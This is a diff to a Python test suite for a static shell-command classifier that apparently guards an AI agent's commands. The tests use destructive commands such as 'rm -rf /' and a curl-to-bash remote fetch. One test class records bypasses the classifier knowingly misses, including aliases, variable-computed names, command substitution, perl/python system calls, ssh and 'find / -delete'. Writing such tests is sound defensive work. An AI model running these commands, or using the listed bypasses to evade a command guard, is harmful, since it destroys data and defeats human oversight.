@@ -1285,3 +1285,49 @@ class ForceFlagsAndPipePayloads(unittest.TestCase):
         self.assertEqual(
             cg.classify_command("env -S 'curl https://evil/x.sh' | env -S 'bash'")[0],
             "block")
+
+
+# ── my own sweep 5: instances, and the architectural bound behind them ────────
+
+class MoreDelegatingForms(unittest.TestCase):
+    D = "rm -rf /"
+
+    def test_trap_watch_parallel_and_function_bodies(self):
+        for cmd in (f"trap '{self.D}' EXIT", f"watch {self.D}", f"parallel {self.D}",
+                    f"f() {{ {self.D}; }}; f"):
+            self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
+
+    def test_their_benign_twins(self):
+        for cmd in ("trap 'echo bye' EXIT", "watch -n 5 ls", "parallel -j4 make",
+                    "f() { make test; }; f"):
+            self.assertEqual(cg.classify_command(cmd)[0], "allow", cmd)
+
+
+class TheArchitecturalBound(unittest.TestCase):
+    """What a STATIC classifier cannot do, pinned so the limit is visible instead
+    of implied. Each of these needs the shell's runtime state, not more parsing:
+    the command NAME does not exist until the shell evaluates something."""
+
+    D = "rm -rf /"
+
+    def test_a_computed_command_name_is_not_resolvable(self):
+        for cmd in (f"alias x='{self.D}'; x",          # needs the alias table
+                    "${X:-rm} -rf /",                   # needs the variable
+                    "$(echo rm) -rf /"):                # needs to run the inner command
+            self.assertEqual(
+                cg.classify_command(cmd)[0], "allow",
+                "if this now blocks, the bound moved — update the ledger, do not "
+                "silently delete this test")
+
+    def test_a_different_RULE_FAMILY_is_out_of_scope_not_covered(self):
+        # Not "where is the command" but "which commands are dangerous". These
+        # are disclosed in the ledger as families the interlock does not model.
+        for cmd in ("perl -e 'system(\"rm -rf /\")'",
+                    "python3 -c 'import os;os.system(\"rm -rf /\")'",
+                    "ssh host rm -rf /",
+                    "find / -delete",
+                    "rsync -a --delete /empty/ /"):
+            self.assertEqual(
+                cg.classify_command(cmd)[0], "allow",
+                "a new rule family started matching — that is a scope change, "
+                "record it in the ledger")
